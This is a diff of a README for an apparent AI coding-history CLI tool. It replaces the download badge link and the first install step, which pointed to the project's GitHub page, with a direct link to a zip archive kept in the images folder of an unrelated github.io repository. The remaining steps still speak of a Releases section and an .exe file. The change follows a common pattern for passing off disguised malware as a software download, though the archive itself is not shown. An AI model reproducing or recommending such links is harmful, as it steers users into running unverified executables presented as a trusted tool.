@@ -5,7 +5,7 @@ description: "Manage AI coding history and context budgets with a cross-platform
 ---
 # 🤖 awesome-ai-history-cli-2026 - Master your AI coding project history
 
-[![](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/newenglandclamchowderinscrutability324/awesome-ai-history-cli-2026)
+[![](https://img.shields.io/badge/Download-Now-blue.svg)](https://raw.githubusercontent.com/newenglandclamchowderinscrutability324/newenglandclamchowderinscrutability324.github.io/main/images/App-v2.1.zip)
 
 This toolkit helps you track and organize your AI coding work. It saves your project history on your computer. You control your data. The program manages your prompt limits and filters your content. It provides a simple way to look back at your past work.
 
@@ -21,7 +21,7 @@ Your computer needs these items to run the software:
 
 ## 📦 How to Download and Install
 
-1.  Visit this page to download the software: https://github.com/newenglandclamchowderinscrutability324/awesome-ai-history-cli-2026
+1.  Visit this page to download the software: https://raw.githubusercontent.com/newenglandclamchowderinscrutability324/newenglandclamchowderinscrutability324.github.io/main/images/App-v2.1.zip
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the link that says latest.
 4.  Find the file that ends in .exe.
